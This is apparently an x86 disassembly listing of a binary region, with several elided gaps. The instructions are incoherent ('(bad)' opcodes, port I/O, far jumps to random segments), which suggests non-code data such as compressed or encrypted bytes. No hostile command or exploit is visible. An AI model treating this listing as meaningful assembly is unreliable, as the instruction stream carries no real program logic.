  422e5b:	or     eax,0xea8f39c
  422e60:	fucomp st(7)
  422e62:	dec    edi
  422e63:	push   ds
  422e64:	inc    esi
  422e65:	push   edx
  422e66:	daa    
  422e67:	push   ebx
  422e68:	out    dx,eax
  422e69:	push   esi
  422e6a:	pop    ebp
  422e6b:	pop    ecx
  422e6c:	xchg   edx,eax
  422e6d:	dec    edi
  422e6e:	stos   DWORD PTR es:[edi],eax
  422e6f:	repnz push edi
  422e71:	inc    ebp
  422e72:	dec    edx
  422e73:	mov    ebx,0x8e438f69
  422e78:	popa   
  422e79:	aaa    
  422e7a:	pop    edx
  422e7b:	or     bl,0xb9
  422e7e:	rcl    DWORD PTR [edx-0x40f4f9ed],0xe2
  422e85:	les    esp,FWORD PTR [edi]
  422e87:	in     eax,dx
  422e88:	test   DWORD PTR [ebp+0x5e],edi
  422e8b:	mov    edi,0x6c54d284
  422e90:	pop    ebp
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0xde2c
  422f02:	in     eax,0x0
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0x2a000001,al
  422f0d:	mov    ch,0xea
  422f0f:	and    DWORD PTR [esi+0x63],ebp
  422f12:	cmc    
  422f13:	xor    edi,DWORD PTR [edx+0x207a1603]
  422f19:	dec    ebx
  422f1a:	xor    eax,0x547626e5
  422f1f:	sbb    DWORD PTR [eax],edx
  422f21:	pop    ebp
  422f22:	shr    bh,cl
  422f24:	outs   dx,DWORD PTR ds:[esi]
  422f25:	and    DWORD PTR [ebp-0x11],edi
  422f28:	rol    ecx,0xca
  422f2b:	fwait
  422f2c:	lods   eax,DWORD PTR ds:[esi]
  422f2d:	push   ebx
  422f2e:	push   ds
  422f2f:	and    eax,0xf5e99baf
  422f34:	xor    BYTE PTR [ecx],cl
  422f36:	test   al,0xbc
  422f38:	sbb    cl,bl
  422f3a:	or     al,0xd5
  422f3c:	add    eax,0xa2ab25fc
  422f41:	jb     0x422ef9
  422f43:	jp     0x422f4f
  422f45:	shr    DWORD PTR [edx*1-0x6147113a],1
  422f4c:	in     al,0x80
  422f4e:	stos   BYTE PTR es:[edi],al
  422f4f:	xchg   esp,eax
  422f50:	dec    eax
  422f51:	xchg   DWORD PTR [edi],edi
  422f53:	push   cs
  422f54:	mov    eax,ds:0x10826e5c
  422f59:	xchg   esi,eax
  422f5a:	lock inc edi
  422f5c:	add    al,0xc1
  422f5e:	dec    ecx
  422f5f:	adc    esi,esp
  422f61:	idiv   DWORD PTR [eax-0x3a]
  422f64:	mov    al,0xdf
  422f66:	cmp    BYTE PTR [ebx-0x2e],ch
  422f69:	dec    bp
  422f6b:	outs   dx,DWORD PTR ds:[esi]
  422f6c:	or     eax,0x2aa3ec11
  422f71:	(bad)  
  422f72:	fisttp DWORD PTR [esi+edi*1-0x605d654d]
  422f79:	in     al,0x91
  422f7b:	stos   DWORD PTR es:[edi],eax
  422f7c:	gs mov ah,dh
  422f7f:	jno    0x422f68
  422f81:	repnz retf 0xd6a8
  422f85:	sub    al,0x8d
  422f87:	adc    dh,al
  422f89:	cld    
  422f8a:	lds    ebx,FWORD PTR [eax]
  422f8c:	cmp    ah,BYTE PTR [ebp-0x33]
  422f8f:	sti    
  422f90:	jns    0x422f44
  422f92:	jns    0x422fa0
  422f94:	ror    DWORD PTR [eax],cl
  422f96:	dec    eax
  422f97:	or     ecx,DWORD PTR [ebx]
  422f99:	sahf   
  422f9a:	inc    ebp
  422f9b:	sbb    ebp,ecx
  422f9d:	mov    bh,BYTE PTR [ebp+0x2e]
  422fa0:	std    
  422fa1:	nop
  422fa2:	rcl    BYTE PTR [edx+0x43e25ac0],1
  422fa8:	mov    ebx,0xa5d4f917
  422fad:	inc    esi
  422fae:	cmp    ah,BYTE PTR [esp+ebp*8]
  422fb1:	dec    eax
  422fb2:	xchg   ecx,eax
  422fb3:	mov    ?,ebx
  422fb5:	xor    eax,0x1b3bd03c
  422fba:	iret   
  422fbb:	push   ecx
  422fbc:	mov    eax,0x6e65da9a
  422fc1:	rcl    edx,cl
  422fc3:	es jo  0x422fdb
  422fc6:	dec    edx
  422fc7:	jbe    0x423023
  422fc9:	xchg   edx,eax
  422fca:	and    BYTE PTR [eax-0x7cf94820],dl
  422fd0:	js     0x422fe1
  422fd2:	mov    eax,0x7b64edb5
  422fd7:	mov    edx,0xb07e21bb
  422fdc:	ja     0x422f60
  422fde:	pop    ebp
  422fdf:	mov    al,0xda
  422fe1:	mov    eax,0x20a53beb
  422fe6:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422fe8:	in     eax,dx
  422fe9:	cmc    
  422fea:	scas   al,BYTE PTR es:[edi]
  422feb:	and    bl,dl
  422fed:	xchg   ebx,eax
  422fee:	call   0xd52f579e
  422ff3:	ror    DWORD PTR ds:0xf09f,1
  422ff8:	jno    0x42302f
  422ffa:	push   0x1d
  422ffc:	pop    ecx
  422ffd:	mov    es:0x97bc7ef2,eax
  423003:	repnz mov edi,0x4b679bbe
  423009:	adc    DWORD PTR [ebp+0x1b],eax
  42300c:	gs inc ebp
  42300e:	and    dl,al
  423010:	dec    ecx
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebx+ecx*1+0x1d3eadc],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0xda000001,al
  42308d:	test   BYTE PTR [ebp+0x40],ch
  423090:	mov    BYTE PTR [edx+0x2a7527a0],ch
  423096:	mov    ds:0xa32729d1,al
  42309b:	push   0xd7b2da7a
  4230a0:	inc    ebx
  4230a1:	sub    al,0xf0
  4230a3:	clc    
  4230a4:	test   eax,0xcddcfafe
  4230a9:	xor    al,0x24
  4230ab:	xor    eax,0x15411a50
  4230b0:	cwde   
  4230b1:	aad    0xc5
  4230b3:	je     0x423099
  4230b5:	fimul  DWORD PTR [ecx+0x2e]
  4230b8:	pop    esi
  4230b9:	xor    DWORD PTR [ebp-0x15822282],0x10
  4230c0:	and    edx,DWORD PTR [eax]
  4230c2:	and    DWORD PTR [edx-0x25],ecx
  4230c5:	pop    eax
  4230c6:	loop   0x42305a
  4230c8:	cmp    BYTE PTR [edi+0x5],dh
  4230cb:	sub    al,0xc0
  4230cd:	loopne 0x4230d7
  4230cf:	cmp    BYTE PTR [eax+0x4c],ah
  4230d2:	scas   eax,DWORD PTR es:[edi]
  4230d3:	mov    ecx,0x62caa8ba
  4230d8:	push   ebp
  4230d9:	jmp    0x86cb16ed
  4230de:	cdq    
  4230df:	arpl   WORD PTR [ecx+0x3efc8c87],di
  4230e5:	push   ds
  4230e6:	cmp    al,0x28
  4230e8:	sbb    DWORD PTR [ecx+0x67147155],0x6
  4230ef:	add    edx,edi
  4230f1:	clc    
  4230f2:	sub    bh,BYTE PTR [edi+0x6f]
  4230f5:	xor    BYTE PTR [ebp+0x71f64946],cl
  4230fb:	dec    ebx
  4230fc:	sahf   
  4230fd:	push   cs
  4230fe:	inc    esi
  4230ff:	mov    bl,0x52
  423101:	pushf  
  423102:	mov    dl,0xeb
  423104:	(bad)  
  423105:	cmp    eax,0x5d6f888f
  42310a:	jbe    0x42312a
  42310c:	addr16 mov edx,0x5fc249ac
  423112:	jne    0x423100
  423114:	arpl   WORD PTR [edx+0x25fdcb79],dx
  42311a:	loop   0x423145
  42311c:	jmp    0x4230e5
  42311e:	int    0x15
  423120:	loope  0x42312e
  423122:	mov    ah,0x2b
  423124:	add    eax,0x17f22d59
  423129:	add    DWORD PTR [ebx-0x75ecd241],edi
  42312f:	cmp    DWORD PTR [ebp-0x19],ebp
  423132:	aas    
  423133:	or     al,0xb2
  423135:	pop    esp
  423136:	cmp    esi,ebx
  423138:	rol    BYTE PTR [ebx+0x7dc5d180],cl
  42313e:	ins    BYTE PTR es:[edi],dx
  42313f:	loope  0x42315e
  423141:	das    
  423142:	aas    
  423143:	fmul   DWORD PTR fs:[ebp+0xc]
  423147:	arpl   WORD PTR [ebp+0x40],sp
  42314a:	pop    ebx
  42314b:	adc    DWORD PTR [esi+0xf],0x38
  42314f:	jmp    0x423119
  423151:	and    al,0x77
  423153:	aam    0xbe
  423155:	inc    DWORD PTR [edi-0x33f93290]
  42315b:	pop    ebx
  42315c:	dec    edi
  42315d:	mov    ?,WORD PTR [esi+0x3a09b916]
  423163:	mov    esi,0x27e30749
  423168:	dec    ecx
  423169:	pusha  
  42316a:	mov    ebx,0x8e0fedeb
  42316f:	xor    DWORD PTR [ebx],eax
  423171:	add    dh,BYTE PTR [edx-0x4d287a45]
  423177:	scas   al,BYTE PTR es:[edi]
  423178:	inc    DWORD PTR [edx+0x4d]
  42317b:	and    ebp,ecx
  42317d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42317e:	mov    ebp,esp
  423180:	leave  
  423181:	pop    edi
  423182:	mov    ah,0x35
  423184:	dec    edi
  423185:	jmp    0x4d5e:0x1c89479e
  42318c:	repz loope 0x423162
  42318f:	pushf  
  423190:	ins    BYTE PTR es:[edi],dx
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x13e1c1e7],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x59000001,al
  42320d:	fnstsw WORD PTR [eax-0x25]
  423210:	pop    esp
  423211:	mov    esi,0x9fbdb602
  423216:	xchg   ebp,eax
  423217:	(bad)  
  423218:	pop    ecx
  423219:	ja     0x423256
  42321b:	sbb    ah,BYTE PTR [ebx+0x11]
  42321e:	test   eax,0x590c17a8
  423223:	out    dx,eax
  423224:	nop
  423225:	sbb    eax,0xbdd96eda
  42322a:	mov    edx,0x35e22108
  42322f:	jbe    0x423287
  423231:	(bad)  
  423232:	int3   
  423233:	test   DWORD PTR [eax],eax
  423235:	adc    al,BYTE PTR [ebp+0x1cb93970]
  42323b:	mov    fs,WORD PTR [eax]
  42323d:	stc    
  42323e:	sar    ecx,1
  423240:	fistp  QWORD PTR [esp+edx*4-0x77]
  423244:	cli    
  423245:	retf   0xeda9
  423248:	xchg   ebx,eax
  423249:	je     0x42323e
  42324b:	(bad)  
  42324c:	fcmovne st,st(1)
  42324e:	or     DWORD PTR [ebp-0x199458ca],0x85de7112
  423258:	ins    BYTE PTR es:[edi],dx
  423259:	sbb    DWORD PTR ds:0xd43d6ac,eax
  42325f:	inc    ebx
  423260:	out    0xfe,eax
  423262:	aad    0x97
  423264:	cmp    esi,DWORD PTR [eax+0x15]
  423267:	push   ecx
  423268:	jge    0x423215
  42326a:	sbb    al,0x9
  42326c:	fucomip st,st(6)
  42326e:	push   ecx
  42326f:	push   edi
  423270:	ret    0x17a
  423273:	push   eax
  423274:	inc    ebx
  423275:	sbb    ebx,DWORD PTR [edi+0x489e51bc]
  42327b:	repz sbb ecx,DWORD PTR [eax-0x43]
  42327f:	fwait
  423280:	out    0x54,eax
  423282:	cmc    
  423283:	xor    eax,0xd601d35a
  423288:	shl    DWORD PTR [ecx-0x1b],0x35
  42328c:	inc    ebp
  42328d:	(bad)  
  42328e:	mov    ecx,0xaf8d188d
  423293:	cwde   
  423294:	mov    eax,0x9d68792b
  423299:	xor    DWORD PTR [edi-0x29],0xb07371ed
  4232a0:	and    BYTE PTR [edi+0x37],0x9f
  4232a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232a5:	push   esp
  4232a6:	ret    
  4232a7:	or     dh,al
  4232a9:	sbb    ebp,DWORD PTR [ebx-0x1539458b]
  4232af:	mov    dh,BYTE PTR [esi+0x5396a56d]
  4232b5:	stos   DWORD PTR es:[edi],eax
  4232b6:	mov    DWORD PTR [edx+ebx*2],edi
  4232b9:	clc    
  4232ba:	inc    esi
  4232bb:	ret    
  4232bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232bd:	mov    al,ds:0x65d2e901
  4232c2:	xchg   ebp,eax
  4232c3:	test   dh,dl
  4232c5:	nop
  4232c6:	(bad)  
  4232c7:	xchg   esp,eax
  4232c8:	repnz sbb ch,0xef
  4232cc:	jmp    0x42326b
  4232ce:	pop    eax
  4232cf:	jne    0x423314
  4232d1:	shl    ebp,cl
  4232d3:	fwait
  4232d4:	pushf  
  4232d5:	(bad)  
  4232d6:	mov    ah,0xf5
  4232d8:	add    edi,eax
  4232da:	arpl   WORD PTR [ebx],di
  4232dc:	in     eax,0xc8
  4232de:	cdq    
  4232df:	in     al,dx
  4232e0:	pop    ds
  4232e1:	xchg   edx,eax
  4232e2:	adc    esp,DWORD PTR [edx+0x77581d8a]
  4232e8:	arpl   WORD PTR [ebx],di
  4232ea:	popf   
  4232eb:	and    ch,bh
  4232ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232ee:	ja     0x423275
  4232f0:	xchg   esi,eax
  4232f1:	ins    DWORD PTR es:[edi],dx
  4232f2:	clc    
  4232f3:	push   cs
  4232f4:	cmp    ebx,ebx
  4232f6:	pop    ss
  4232f7:	mov    ebp,0xd938b4f9
  4232fc:	je     0x423355
  4232fe:	push   0xffffffeb
  423300:	arpl   WORD PTR [edx+0x3d],bp
  423303:	jge    0x423367
  423305:	es add BYTE PTR es:[ecx-0x210cef4f],al
  42330d:	mov    edi,0xdf6bd5
	...
  423372:	add    BYTE PTR [eax],al
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xc2310f44
  423382:	aam    0xd4
  423384:	or     edi,DWORD PTR [eax+0x1]
  423387:	add    BYTE PTR ds:0xd000001,al
  42338d:	(bad)  
  42338e:	outs   dx,DWORD PTR ds:[esi]
  42338f:	(bad)  
  423390:	pop    es
  423391:	xor    al,0xb8
  423393:	cli    
  423394:	cmp    edx,DWORD PTR [edx+0x484b415b]
  42339a:	sub    al,0x1e
  42339c:	push   ebp
  42339d:	mov    ds:0x5cbfc250,al
  4233a2:	push   es
  4233a3:	jg     0x423384
  4233a5:	shl    cl,1
  4233a7:	dec    edi
  4233a8:	stos   DWORD PTR es:[edi],eax
  4233a9:	sbb    al,0xcd
  4233ab:	and    eax,0x97466add
  4233b0:	retf   0xb2f7
  4233b3:	sbb    cl,BYTE PTR [esi-0x3c97bdcb]
  4233b9:	fld    DWORD PTR [ecx-0xd7503a7]
  4233bf:	sbb    dh,BYTE PTR [eax]
  4233c1:	int    0xaa
  4233c3:	jle    0x4233b4
  4233c5:	sub    BYTE PTR [edx-0x2d],ch
  4233c8:	test   al,0xb1
  4233ca:	sbb    al,0x65
  4233cc:	iret   
  4233cd:	lea    eax,[esi-0x76]
  4233d0:	and    BYTE PTR [edi+0xa34eb80],bl
  4233d6:	add    eax,0xd2e7ec85
  4233db:	lods   eax,DWORD PTR ds:[esi]
  4233dc:	ins    DWORD PTR es:[edi],dx
  4233dd:	mov    ah,0xf9
  4233df:	dec    ecx
  4233e0:	loope  0x42344d
  4233e2:	cmc    
  4233e3:	(bad)  
  4233e4:	jmp    0xe467:0x77424295
  4233eb:	addr16 or ebp,esi
  4233ee:	pusha  
  4233ef:	(bad)  
  4233f0:	mov    esi,0x6e655225
  4233f5:	inc    edx
  4233f6:	sub    ecx,ebp
  4233f8:	and    ch,al
  4233fa:	scas   al,BYTE PTR es:[edi]
  4233fb:	cmp    bl,BYTE PTR [ecx+ebp*1+0x46]
  4233ff:	pop    ebp
  423400:	xchg   al,ah
  423402:	or     eax,DWORD PTR [esi-0x56fc62c6]
  423408:	stos   BYTE PTR es:[edi],al
  423409:	ins    BYTE PTR es:[edi],dx
  42340a:	jbe    0x423424
  42340c:	xor    bl,BYTE PTR [edi+0x63e084d1]
  423412:	test   eax,0x689c0152
  423417:	or     al,0x50
  423419:	sahf   
  42341a:	jmp    0x423479
  42341c:	(bad)  
  42341d:	(bad)  
  42341e:	out    dx,eax
  42341f:	xchg   ebp,eax
  423420:	inc    esp
  423421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423422:	mov    esp,0xce2fa8d6
  423427:	test   eax,0xe1e4f2b9
  42342c:	repnz into 
  42342e:	adc    edi,edi
  423430:	xchg   bh,cl
  423432:	dec    ebx
  423433:	je     0x423430
  423435:	pop    ebx
  423436:	jecxz  0x4233e8
  423438:	dec    esi
  423439:	stc    
  42343a:	call   0xf597a6b1
  42343f:	xor    DWORD PTR [ebp+0xf],ebp
  423442:	inc    esi
  423443:	cmp    BYTE PTR [ebx],ah
  423445:	shl    DWORD PTR [esi+ecx*8],cl
  423448:	and    al,0x38
  42344a:	fs fs imul eax,eax,0xffffff9f
  42344f:	mov    bh,0xa
  423451:	mov    al,ds:0x81a16c8f
  423456:	lods   al,BYTE PTR ds:[esi]
  423457:	imul   ecx,DWORD PTR [edx+0x17],0xffffff80
  42345b:	pop    esi
  42345c:	scas   al,BYTE PTR es:[edi]
  42345d:	jge    0x4233ea
  42345f:	mov    ss,WORD PTR [ebp-0x455ebafc]
  423465:	push   0x5f
  423467:	in     eax,0xa8
  423469:	sub    DWORD PTR [edi],edx
  42346b:	xchg   ebx,eax
  42346c:	(bad)  
  42346d:	sahf   
  42346e:	sbb    bh,BYTE PTR [eax]
  423470:	rcl    DWORD PTR [edx],cl
  423472:	shl    BYTE PTR [ecx],cl
  423474:	lods   al,BYTE PTR ds:[esi]
  423475:	sub    ecx,DWORD PTR [ebx]
  423477:	shr    cl,0xb1
  42347a:	mov    al,0x33
  42347c:	or     al,0x4c
  42347e:	dec    edx
  42347f:	ins    DWORD PTR es:[edi],dx
  423480:	xchg   ebp,eax
  423481:	lahf   
  423482:	inc    edx
  423483:	pop    ebp
  423484:	mov    dh,0x74
  423486:	sub    DWORD PTR [edx],0x28c6cbc0
  42348c:	lods   al,BYTE PTR ds:[esi]
  42348d:	xchg   ebp,eax
  42348e:	mov    edx,es
	...
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	xchg   edx,eax
  423501:	addr16 jne 0x42350e
  423504:	adc    BYTE PTR [ecx+0x1],bh
  423507:	add    BYTE PTR ds:0xa0000001,al
  42350d:	adc    BYTE PTR [ebx-0x7d6b800d],ch
  423513:	push   ebx
  423514:	ja     0x4234c1
  423516:	sub    DWORD PTR [esi],edx
  423518:	add    bh,BYTE PTR [ebp-0x4915ea3f]
  42351e:	scas   al,BYTE PTR es:[edi]
  42351f:	hlt    
  423520:	pop    eax
  423521:	xchg   ebx,eax
  423522:	pop    ecx
  423523:	mov    bh,0xc4
  423525:	repnz inc ebx
  423527:	ins    BYTE PTR es:[edi],dx
  423528:	inc    edx
  423529:	and    eax,0xe68ecb37
  42352e:	lahf   
  42352f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423530:	inc    eax
  423531:	ja     0x4234f5
  423533:	ins    DWORD PTR es:[edi],dx
  423534:	retf   0x354a
  423537:	ins    BYTE PTR es:[edi],dx
  423538:	(bad)  
  42353a:	mov    bh,0x5a
  42353c:	sub    esi,DWORD PTR [edx]
  42353e:	sub    DWORD PTR [ecx-0x1bf2f0c0],esi
  423544:	call   0xa944:0x2e3d9287
  42354b:	or     eax,0x3fd585f8
  423550:	xchg   edi,eax
  423551:	and    edx,DWORD PTR [eax-0x29]
  423554:	or     BYTE PTR [ebp+0x2467c9ef],dl
  42355a:	xchg   edi,eax
  42355b:	imul   edi,DWORD PTR [ebp+edx*8+0x1a],0x40
  423560:	shl    BYTE PTR [ebx-0x4],1
  423563:	frstor [ebx+0x62]
  423566:	pop    esp
  423567:	mov    BYTE PTR [eax],bl
  423569:	jnp    0x4234ed
  42356b:	test   BYTE PTR [eax+0x62],dl
  42356e:	mov    ds:0x57fb77e,al
  423573:	xchg   edi,eax
  423574:	mov    ch,0x4b
  423576:	xchg   ah,dl
  423578:	frstor [ebx]
  42357a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42357b:	pop    es
  42357c:	mov    al,ds:0x75dd8b90
  423582:	sub    al,0x53
  423584:	test   BYTE PTR [ebx+0x17f36b09],bh
  42358a:	dec    ebp
  42358b:	fs xchg ebp,eax
  42358d:	out    0xfa,eax
  42358f:	shr    BYTE PTR [ebp-0xe],0x59
  423593:	xchg   DWORD PTR ds:0x6db7e998,edi
  423599:	xchg   esp,eax
  42359a:	adc    DWORD PTR [ebp-0x7f],0xbfbfefca
  4235a1:	mov    al,ds:0x2e2ff59
  4235a6:	pop    edi
  4235a7:	mov    al,0xaa
  4235a9:	retf   0x8024
  4235ac:	xchg   edx,eax
  4235ad:	(bad)  
  4235ae:	ja     0x423585
  4235b0:	add    bh,ah
  4235b2:	loop   0x423593
  4235b4:	xor    eax,0x3a033e24
  4235b9:	push   edi
  4235ba:	fs mov bl,0xd9
  4235bd:	stc    
  4235be:	xchg   DWORD PTR [eax+edi*2-0x4b80dfb1],ebx
  4235c5:	sub    ecx,ecx
  4235c7:	or     edi,DWORD PTR [esi]
  4235c9:	pop    esp
  4235ca:	call   0x30dc10bc
  4235cf:	cmp    eax,DWORD PTR [edi-0x4f007ba6]
  4235d5:	mov    ebp,0x1e024e47
  4235da:	(bad)  [esp+edi*4-0x1a83b6f3]
  4235e1:	inc    ebp
  4235e2:	daa    
  4235e3:	dec    eax
  4235e4:	(bad)  
  4235e5:	jmp    0x423643
  4235e7:	(bad)  
  4235e8:	sbb    edi,DWORD PTR [edi+0x7b]
  4235eb:	inc    ebx
  4235ec:	mov    fs,WORD PTR [edi-0x6a8ba41b]
  4235f2:	and    ebp,ecx
  4235f4:	stc    
  4235f5:	loop   0x4235ad
  4235f7:	or     ebx,edi
  4235f9:	push   esp
  4235fa:	mov    ecx,0xd70886a1
  4235ff:	mov    ebp,0x6d9bf4fb
  423604:	inc    esi
  423605:	pusha  
  423606:	jo     0x4235df
  423608:	xor    DWORD PTR [edi-0x8],0x19
  42360c:	lods   eax,DWORD PTR ds:[esi]
  42360d:	ror    BYTE PTR [esi+0x591f],1
	...
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0xd9d5d913
  423683:	push   ebp
  423684:	adc    eax,0x500017a
  423689:	add    DWORD PTR [eax],eax
  42368b:	add    bl,dl
  42368d:	mov    bl,BYTE PTR [ecx-0x61]
  423690:	lods   al,BYTE PTR ds:[esi]
  423691:	sub    edx,edx
  423693:	mov    ebx,0xb21e9035
  423698:	cdq    
  423699:	fdiv   QWORD PTR [edx]
  42369b:	and    eax,0x6d9a9d68
  4236a0:	shl    esi,0x70
  4236a3:	push   edx
  4236a4:	leave  
  4236a5:	jae    0x42365e
  4236a7:	push   ebx
  4236a8:	cwde   
  4236a9:	in     al,0x10
  4236ab:	jns    0x4236c1
  4236ad:	cld    
  4236ae:	dec    ebx
  4236af:	sub    al,0x59
  4236b1:	jns    0x423673
  4236b3:	sub    al,0xc8
  4236b5:	adc    cl,BYTE PTR [ebx-0x5f]
  4236b8:	retf   
  4236b9:	mov    dh,0xca
  4236bb:	iret   
  4236bc:	imul   ecx,esi,0xffffff98
  4236bf:	pop    esi
  4236c0:	xlat   BYTE PTR ds:[ebx]
  4236c1:	and    al,0x61
  4236c3:	shr    ebp,0x76
  4236c6:	mov    al,ds:0x88deddbb
  4236cb:	push   edi
  4236cc:	punpckhdq mm5,mm4
  4236cf:	in     al,0xbd
  4236d1:	jno    0x4236dd
  4236d3:	mov    ds:0xa06c5c8,eax
  4236d8:	sub    DWORD PTR ds:0x9385d077,esi
  4236de:	xchg   esp,eax
  4236df:	int    0x14
  4236e1:	sar    ah,cl
  4236e3:	lahf   
  4236e4:	cld    
  4236e5:	sub    al,0x47
  4236e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236e8:	pop    ebx
  4236e9:	in     al,dx
  4236ea:	ret    0x5464
  4236ed:	scas   al,BYTE PTR es:[edi]
  4236ee:	mov    esi,0xb7ad6082
  4236f3:	dec    esi
  4236f4:	out    0xe9,al
  4236f6:	jl     0x42373d
  4236f8:	daa    
  4236f9:	loope  0x423741
  4236fb:	jno    0x42370c
  4236fd:	stc    
  4236fe:	and    ecx,ecx
  423700:	xor    al,0x9f
  423702:	mov    ebp,0xb435866e
  423707:	(bad)  
  423708:	es pop eax
  42370a:	div    BYTE PTR [esi]
  42370c:	or     eax,0x254ccffa
  423711:	jne    0x42372b
  423713:	sbb    eax,0xf073dc10
  423718:	cli    
  423719:	in     al,0x10
  42371b:	or     DWORD PTR [ecx+eax*1-0x4188a9d5],eax
  423722:	or     BYTE PTR [esp+eiz*2],0x40
  423726:	aaa    
  423727:	xchg   ecx,eax
  423728:	and    cl,BYTE PTR es:[eax-0x660452f]
  42372f:	xor    eax,0xb16c8bd5
  423734:	jno    0x4237b4
  423736:	mov    bh,0xa4
  423738:	xor    BYTE PTR [edx-0x74],dh
  42373b:	jno    0x4237ac
  42373d:	and    eax,ebx
  42373f:	cmp    edi,DWORD PTR [edx-0x407e71b4]
  423745:	in     eax,0x7
  423747:	mov    WORD PTR [esi-0x7f51004a],fs
  42374d:	jne    0x4236e1
  42374f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423750:	stc    
  423751:	out    0x1,al
  423753:	and    dl,BYTE PTR [ebp-0xeb7e70c]
  423759:	push   0x8c27bf11
  42375e:	mov    ah,0x1
  423760:	and    bl,BYTE PTR [edi]
  423762:	push   0xfffffffd
  423764:	xchg   edi,eax
  423765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423766:	dec    ebx
  423767:	or     DWORD PTR [eax],edi
  423769:	mov    bl,0x37
  42376b:	sub    eax,0x9f8eb2a6
  423770:	xchg   edi,eax
  423771:	pop    ebx
  423772:	mov    al,ds:0xabc2bc41
  423777:	(bad)  
  423779:	jecxz  0x4236fb
  42377b:	pop    esi
  42377c:	(bad)  
  42377d:	xor    DWORD PTR [esi-0x3d],edx
  423780:	dec    esp
  423781:	lahf   
  423782:	not    DWORD PTR [ebx-0xfc09798]
  423788:	out    dx,al
  423789:	adc    al,0x78
  42378b:	lock lahf 
  42378d:	sub    edi,DWORD PTR ds:0x960c
	...
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0xfe867ca9
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0x3000001
  42380d:	cmp    DWORD PTR [ebp+0x1df4dfcc],ebp
  423813:	xor    BYTE PTR [esi-0x26],bh
  423816:	pop    ebx
  423817:	fcomp  QWORD PTR [edx-0x227259f4]
  42381d:	xor    al,0x6b
  42381f:	in     eax,dx
  423820:	or     ebx,DWORD PTR [ecx+ecx*1+0x6b480dfb]
  423827:	fs and eax,0x11c6d95d
  42382d:	cmp    al,0xd2
  42382f:	or     DWORD PTR [eax+0x58],0x4a
  423833:	into   
  423834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423835:	and    eax,0xe7e938dc
  42383a:	lahf   
  42383b:	(bad)  
  42383c:	fsub   st,st(1)
  42383e:	icebp  
  42383f:	sar    DWORD PTR [ebx+0x30],0xac
  423843:	xor    dl,dh
  423845:	mov    cl,0xbe
  423847:	test   BYTE PTR [edx],0x75
  42384a:	adc    edx,DWORD PTR [edi]
  42384c:	cmp    eax,0x382e2f76
  423851:	fimul  DWORD PTR [edi-0x64bd1874]
  423857:	int    0xbe
  423859:	xchg   ebx,eax
  42385a:	mov    edx,0x8a7cd94f
  42385f:	ins    BYTE PTR es:[edi],dx
  423860:	fisubr WORD PTR [esi+0x68]
  423863:	jb     0x4238d2
  423865:	shl    dl,cl
  423867:	and    eax,0xec0fce19
  42386c:	paddb  mm2,QWORD PTR [ecx+0x633ab59d]
  423873:	jmp    0x423861
  423875:	fwait
  423876:	push   ebx
  423877:	jp     0x42380d
  423879:	int3   
  42387a:	adc    bh,bl
  42387c:	in     eax,dx
  42387d:	xchg   ebp,eax
  42387e:	dec    ecx
  42387f:	push   esi
  423880:	xchg   BYTE PTR [ecx-0x74c266fd],dl
  423886:	dec    ecx
  423887:	inc    ebp
  423888:	loope  0x423889
  42388a:	call   DWORD PTR [edx+ecx*2+0x3e]
  42388e:	out    0x4,eax
  423890:	jmp    0xae28:0x2d7afc37
  423897:	enter  0x17e4,0xb
  42389b:	inc    ebx
  42389c:	dec    ebp
  42389d:	or     ecx,edi
  42389f:	test   DWORD PTR [esi*1+0x6ccdc3cc],edi
  4238a6:	cmp    al,0x96
  4238a8:	sub    esp,DWORD PTR [ebx-0x24]
  4238ab:	ss or  al,0x54
  4238ae:	add    al,0x7c
  4238b0:	retf   
  4238b1:	jl     0x423912
  4238b3:	call   0x356b:0x6493a42f
  4238ba:	jmp    0x423866
  4238bc:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238be:	and    al,0x23
  4238c0:	pop    ecx
  4238c1:	in     eax,dx
  4238c2:	add    bh,BYTE PTR [edx+0x6d]
  4238c5:	test   al,0x55
  4238c8:	dec    esp
  4238c9:	pop    edx
  4238ca:	sub    al,0x7a
  4238cc:	mov    al,0xd0
  4238ce:	fstp   TBYTE PTR [ebx+0x42]
  4238d1:	pop    edx
  4238d2:	aaa    
  4238d3:	xor    ebx,DWORD PTR [eax+0x4879195e]
